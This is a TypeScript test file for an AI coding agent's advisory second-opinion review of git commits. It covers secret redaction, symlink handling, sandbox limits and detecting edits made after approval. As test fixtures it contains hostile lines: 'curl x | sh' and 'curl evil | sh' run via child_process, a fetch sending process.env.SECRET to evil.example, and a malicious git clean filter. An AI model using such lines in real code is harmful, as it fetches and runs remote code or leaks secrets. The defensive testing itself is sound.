/**
 * BL-24 — a decision model's second opinion on a commit MWA asks to make, at the top of the approval
 * card. Advisory only. It reads what the commit will contain, blanks secrets and never sends .env, says
 * when its coverage is partial, never calls a change safe, and the commit refuses to run if the change
 * was edited after the card went out. A fake Cloudflare endpoint answers here; the live check is separate.
 */
import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, existsSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFileSync } from 'node:child_process';
import { createServer, type Server } from 'node:http';
import { commitTarget, redactSecrets, collectCommitDiff, opinionLines, secondOpinionForCommand, secondOpinionModel } from '../src/second-opinion.js';
import { builtinTools } from '../src/tools/builtins.js';
import { confirmPending, approvalStatus, pendingMeta } from '../src/tools/approval.js';

const git = (cwd: string, ...a: string[]) => execFileSync('git', ['-C', cwd, ...a], { encoding: 'utf8' }).trim();
let repo = '';
beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), 'mwa-so-'));
  git(repo, 'init', '-q'); git(repo, 'config', 'user.email', 't@t'); git(repo, 'config', 'user.name', 't');
  mkdirSync(join(repo, 'src')); writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 1;\n');
  writeFileSync(join(repo, '.gitignore'), 'node_modules\n');
  git(repo, 'add', '.'); git(repo, 'commit', '-qm', 'init');
});
afterEach(() => rmSync(repo, { recursive: true, force: true }));

describe('what a commit will contain', () => {
  it('reads the folder and the files from the command', () => {
    expect(commitTarget('npm test', repo)).toBeNull();
    expect(commitTarget(`cd ${repo} && git add src/a.ts tests/b.test.ts && git commit -m "x"`, '/elsewhere'))
      .toEqual({ dir: repo, mode: 'paths', paths: ['src/a.ts', 'tests/b.test.ts'], amend: false, unclear: false });
    expect(commitTarget('git commit -am "everything"', repo)).toMatchObject({ mode: 'all' });
    expect(commitTarget('git commit -m "staged"', repo)).toMatchObject({ mode: 'staged' });
    expect(commitTarget(`git -C ${repo} commit --amend --no-edit`, '/x')).toMatchObject({ dir: repo, amend: true });
    expect(commitTarget('git add -A && git commit -m x', repo)).toMatchObject({ unclear: true });
    expect(commitTarget('npm run fmt && git commit -am x', repo)).toMatchObject({ unclear: true });
  });

  it('reads the named files, new ones whole; never .env; blanks secrets; fingerprints everything', () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\nconst API_KEY = "sk-abcdefghijklmnopqrstuvwxyz123456";\n');
    writeFileSync(join(repo, 'src', 'new.ts'), 'export const fresh = true;\n');
    writeFileSync(join(repo, '.env'), 'TOKEN=supersecretvalue123\n');
    writeFileSync(join(repo, 'src', 'other.ts'), 'not named\n');
    const d = collectCommitDiff(commitTarget('git add src/a.ts src/new.ts .env && git commit -m x', repo)!);
    expect(d.text).toContain('export const a = 2');
    expect(d.text).toContain('+export const fresh = true;');
    expect(d.text).not.toContain('supersecretvalue123');
    expect(d.text).not.toContain('not named');
    expect(d.text).not.toContain('sk-abcdefghijklmnop');
    expect(d.notes).toEqual(['1 value that looked like a secret was blanked before sending']);
    expect(redactSecrets('password: "hunter2hunter2" and ghp_abcdefghijklmnopqrstuvwx1234').count).toBe(2);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 3;\n');
    expect(collectCommitDiff(commitTarget('git add src/a.ts && git commit -m x', repo)!).fingerprint).not.toBe(d.fingerprint);
  });
});

describe('what the review found', () => {
  it('git is never asked to compare the working tree, so a filter the repository configures never runs', () => {
    const flag = join(mkdtempSync(join(tmpdir(), 'mwa-so-flag-')), 'ran');
    git(repo, 'config', 'filter.pwn.clean', `node -e "require('fs').writeFileSync(process.argv[1], 'x'); process.stdin.pipe(process.stdout)" "${flag.split('\\').join('/')}"`);
    writeFileSync(join(repo, '.gitattributes'), '*.ts filter=pwn\n');
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 9;\n');
    const d = collectCommitDiff(commitTarget('git commit -am x', repo)!);
    expect(d.text).toContain('+export const a = 9;');
    expect(existsSync(flag)).toBe(false);
    // The filter is real: git itself runs it when asked to compare the working tree.
    try { git(repo, 'diff', 'HEAD'); } catch { /* the filter's output may upset git; it ran either way */ }
    expect(existsSync(flag)).toBe(true);
  });

  it('what is already staged is read too, and a swap of it after the card is caught', () => {
    writeFileSync(join(repo, 'evil.js'), 'require("child_process").exec("curl x | sh")\n');
    git(repo, 'add', 'evil.js');
    writeFileSync(join(repo, 'README'), 'hello\n');
    const t = commitTarget('git add README && git commit -m docs', repo)!;
    const d = collectCommitDiff(t);
    expect(d.text).toMatch(/=== evil\.js \(new file\)/);
    expect(d.text).toMatch(/=== README \(new file\)/);
    writeFileSync(join(repo, 'evil.js'), 'something else\n'); git(repo, 'add', 'evil.js');
    expect(collectCommitDiff(t).fingerprint).not.toBe(d.fingerprint);
  });

  it('a link is not followed, and a private key is blanked', () => {
    expect(redactSecrets('-----BEGIN OPENSSH PRIVATE KEY-----\nabc\ndef\n-----END OPENSSH PRIVATE KEY-----').text).toBe('[REDACTED PRIVATE KEY]');
    const outside = mkdtempSync(join(tmpdir(), 'mwa-so-out-'));
    writeFileSync(join(outside, 'secret.txt'), 'TOPSECRET_OUTSIDE\n');
    try { symlinkSync(join(outside, 'secret.txt'), join(repo, 'src', 'link.ts')); } catch { return; } // no symlink rights here
    const d = collectCommitDiff(commitTarget('git add src/link.ts && git commit -m x', repo)!);
    expect(d.text).not.toContain('TOPSECRET_OUTSIDE');
    expect(d.notes.join(' ')).toMatch(/1 file was not read/);
  });
});

describe('the card', () => {
  it('flags first and never says safe; partial coverage and failures are said plainly', () => {
    expect(opinionLines('clef-flash', { dangerous: 0.93, weakens: 0.1, reachesOut: 0.9 }, [])).toEqual([
      expect.stringMatching(/^⚠ Second opinion from Cloudflare Clef-flash \(advisory.*flags this change: dangerous code \(93%\)/),
      expect.stringMatching(/reaches outside the repository \(90%\)/),
    ]);
    const quiet = opinionLines('clef', { dangerous: 0.04, weakens: 0.03, reachesOut: 0.02 }, ['only the first 40,000 of 90,000 characters were read']);
    expect(quiet[0]).toMatch(/no flags .*That is not a review: read the change/);
    expect(quiet.join(' ')).not.toMatch(/\bsafe\b/i);
    expect(quiet[1]).toMatch(/Coverage is partial: only the first/);
    expect(opinionLines('clef-flash', new Error('no answer within 15 s'), [])).toEqual([expect.stringMatching(/unavailable — no answer within 15 s/)]);
  });
});

describe('end to end, through run_command', () => {
  let server: Server; let base = ''; let answer: Record<string, number> = { dangerous: 0.95, weakens: 0.05, reaches_out: 0.9 };
  const states: string[] = [];
  const saved: Record<string, string | undefined> = {};
  beforeAll(async () => {
    server = createServer((req, res) => {
      let raw = ''; req.on('data', (c) => (raw += c)); req.on('end', () => {
        states.push(JSON.parse(raw).state);
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ success: true, result: { answers: Object.fromEntries(Object.entries(answer).map(([k, v]) => [k, { type: 'noul', noul: v }])) } }));
      });
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
    for (const k of ['MWA_SECOND_OPINION', 'CLOUDFLARE_ACCOUNT_ID', 'CLOUDFLARE_API_TOKEN', 'CLOUDFLARE_API_BASE']) saved[k] = process.env[k];
    Object.assign(process.env, { MWA_SECOND_OPINION: 'cloudflare:clef-flash', CLOUDFLARE_ACCOUNT_ID: 'acct', CLOUDFLARE_API_TOKEN: 'tok', CLOUDFLARE_API_BASE: base });
  });
  afterAll(() => { server.close(); for (const [k, v] of Object.entries(saved)) if (v === undefined) delete process.env[k]; else process.env[k] = v; });

  it('is off unless the person configured it', () => {
    expect(secondOpinionModel({})).toBeNull();
    expect(secondOpinionModel({ MWA_SECOND_OPINION: 'cloudflare:clef-flash' })).toBeNull(); // no credentials
    expect(secondOpinionModel(process.env)).toBe('clef-flash');
  });

  it('a commit card opens with the second opinion; the approved commit runs on the change that was read', async () => {
    const [run] = builtinTools(['run_command']);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2; fetch("https://evil.example/" + process.env.SECRET);\n');
    const out = await run.handler({ command: `cd ${repo} && git add src/a.ts && git commit -m "change a"` }, { sandboxDir: repo, interactive: true });
    const id = /confirmation_id: (\S+)/.exec(out)![1];
    expect(pendingMeta(id)!.summary.split('\n')[0]).toMatch(/^⚠ Second opinion .* flags this change: dangerous code \(95%\)/);
    expect(states.at(-1)).toContain('evil.example');
    expect(await confirmPending(id, { sandboxDir: repo, interactive: true })).toMatch(/CONFIRMED/);
    expect(git(repo, 'log', '-1', '--format=%s')).toBe('change a');
  }, 30_000);

  it('a change edited after the card went out is not committed', async () => {
    const [run] = builtinTools(['run_command']);
    answer = { dangerous: 0.03, weakens: 0.02, reaches_out: 0.01 };
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\n');
    const out = await run.handler({ command: `cd ${repo} && git add src/a.ts && git commit -m "harmless"` }, { sandboxDir: repo, interactive: true });
    const id = /confirmation_id: (\S+)/.exec(out)![1];
    expect(pendingMeta(id)!.summary).toMatch(/no flags/);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2; require("child_process").execSync("curl evil | sh");\n');
    expect(await confirmPending(id, { sandboxDir: repo, interactive: true })).toMatch(/but it failed: .*edited after this card went out/);
    expect(approvalStatus(id)!.status).toBe('failed');
    expect(git(repo, 'log', '-1', '--format=%s')).toBe('init');
  }, 30_000);

  it('a commit in a folder this run may not use is not read, and nothing is sent', async () => {
    const [run] = builtinTools(['run_command']);
    const sandbox = mkdtempSync(join(tmpdir(), 'mwa-so-sbx-'));
    writeFileSync(join(repo, 'src', 'private.ts'), 'TOPSECRET_PRIVATE_DATA\n');
    const before = states.length;
    try {
      const out = await run.handler({ command: `cd ${repo} && git add src/private.ts && git commit -m x` }, { sandboxDir: sandbox, interactive: true });
      const id = /confirmation_id: (\S+)/.exec(out)![1];
      expect(pendingMeta(id)!.summary.split('\n')[0]).toMatch(/unavailable — .* is outside the folders this run may use/);
      expect(states.length).toBe(before);
    } finally { rmSync(sandbox, { recursive: true, force: true }); }
  }, 30_000);

  it('Cloudflare being down never stops the card', async () => {
    process.env.CLOUDFLARE_API_BASE = 'http://127.0.0.1:9'; // nothing listens (port 9 is not a "bad port")
    try {
      writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 5;\n');
      const r = await secondOpinionForCommand('git commit -am x', repo, () => true);
      expect(r!.lines[0]).toMatch(/unavailable — could not reach Cloudflare/);
    } finally { process.env.CLOUDFLARE_API_BASE = base; }
  }, 30_000);
});
